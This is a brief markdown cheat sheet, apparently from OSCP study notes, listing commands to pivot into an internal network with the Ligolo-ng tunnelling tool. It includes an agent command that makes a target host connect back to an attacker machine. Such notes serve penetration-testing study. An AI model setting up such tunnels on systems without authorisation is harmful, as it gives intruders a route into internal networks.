## Pivoting with Ligolo-ng 
 
##### Create & start tun interface 
```
ip tuntap add user kali mode tun ligolo
ip link set ligolo up
```
##### Start Ligolo C2/Proxy 
```
./proxy -self-cert
```
#### Add Route to Target Network 
```
ip route list
sudo ip route add 10.10.23.0/24 dev ligolo
```
#### On Target/Jump Host 
```
agent.exe -connect 192.168.119.133:11601 -ignore-cert
```



#### Choose Session & Start Tunnel 
```
session
1
start
```
![image](https://github.com/GwenBSec/OSCP/assets/88676386/9880c83a-0e78-4f5a-9ddb-bd6625b01874)

